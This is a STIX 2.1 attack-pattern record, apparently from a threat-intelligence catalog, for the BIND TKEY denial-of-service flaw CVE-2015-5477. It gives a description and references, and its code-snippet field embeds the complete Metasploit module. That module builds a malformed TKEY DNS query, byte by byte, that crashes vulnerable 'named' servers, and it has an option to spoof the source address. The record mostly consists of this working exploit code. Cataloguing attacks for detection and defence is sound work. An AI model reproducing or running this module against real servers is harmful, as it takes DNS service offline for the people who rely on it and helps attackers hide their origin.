{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--313e7823-442c-4ea3-9d6f-026c44112b72",
    "created": "2024-08-14T16:24:29.683986Z",
    "modified": "2024-08-14T16:24:29.68399Z",
    "name": "BIND TKEY Query Denial of Service",
    "description": " This module sends a malformed TKEY query, which exploits an error in handling TKEY queries on affected BIND9 'named' DNS servers. As a result, a vulnerable named server will exit with a REQUIRE assertion failure. This condition can be exploited in versions of BIND between BIND 9.1.0 through 9.8.x, 9.9.0 through 9.9.7-P1 and 9.10.0 through 9.10.2-P2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/dns/bind_tkey.rb",
            "external_id": "bind_tkey.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-5477"
        },
        {
            "source_name": "reference",
            "url": "https://www.isc.org/blogs/cve-2015-5477-an-error-in-handling-tkey-queries-can-cause-named-to-exit-with-a-require-assertion-failure/"
        },
        {
            "source_name": "reference",
            "url": "https://kb.isc.org/article/AA-01272"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n  include Msf::Auxiliary::UDPScanner\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BIND TKEY Query Denial of Service',\n      'Description'    => %q{\n        This module sends a malformed TKEY query, which exploits an\n        error in handling TKEY queries on affected BIND9 'named' DNS servers.\n        As a result, a vulnerable named server will exit with a REQUIRE\n        assertion failure. This condition can be exploited in versions of BIND\n        between BIND 9.1.0 through 9.8.x, 9.9.0 through 9.9.7-P1 and 9.10.0\n        through 9.10.2-P2.\n      },\n      'Author'         => [\n        'Jonathan Foote',      # Original discoverer\n        'throwawayokejxqbbif', # PoC\n        'wvu'                  # Metasploit module\n      ],\n      'References'     => [\n        ['CVE', '2015-5477'],\n        ['URL', 'https://www.isc.org/blogs/cve-2015-5477-an-error-in-handling-tkey-queries-can-cause-named-to-exit-with-a-require-assertion-failure/'],\n        ['URL', 'https://kb.isc.org/article/AA-01272']\n      ],\n      'DisclosureDate' => '2015-07-28',\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => {'ScannerRecvWindow' => 0}\n    ))\n\n    register_options([\n      Opt::RPORT(53),\n      OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])\n    ])\n\n    deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')\n  end\n\n  def scan_host(ip)\n    if datastore['SRC_ADDR']\n      scanner_spoof_send(payload, ip, rport, datastore['SRC_ADDR'])\n    else\n      print_status(\"Sending packet to #{ip}\")\n      scanner_send(payload, ip, rport)\n    end\n  end\n\n  def payload\n    name = Rex::Text.rand_text_alphanumeric(rand(42) + 1)\n    txt  = Rex::Text.rand_text_alphanumeric(rand(42) + 1)\n\n    name_length = [name.length].pack('C')\n    txt_length  = [txt.length].pack('C')\n    data_length = [txt.length + 1].pack('n')\n    ttl         = [rand(2 ** 31 - 1) + 1].pack('N')\n\n    query  = \"\\x00\\x00\"  # Transaction ID: 0x0000\n    query << \"\\x00\\x00\"  # Flags: 0x0000 Standard query\n    query << \"\\x00\\x01\"  # Questions: 1\n    query << \"\\x00\\x00\"  # Answer RRs: 0\n    query << \"\\x00\\x00\"  # Authority RRs: 0\n    query << \"\\x00\\x01\"  # Additional RRs: 1\n\n    query << name_length # [Name Length]\n    query << name        # Name\n    query << \"\\x00\"      # [End of name]\n    query << \"\\x00\\xf9\"  # Type: TKEY (Transaction Key) (249)\n    query << \"\\x00\\x01\"  # Class: IN (0x0001)\n\n    query << name_length # [Name Length]\n    query << name        # Name\n    query << \"\\x00\"      # [End of name]\n    query << \"\\x00\\x10\"  # Type: TXT (Text strings) (16)\n    query << \"\\x00\\x01\"  # Class: IN (0x0001)\n    query << ttl         # Time to live\n    query << data_length # Data length\n    query << txt_length  # TXT Length\n    query << txt         # TXT\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-28"
}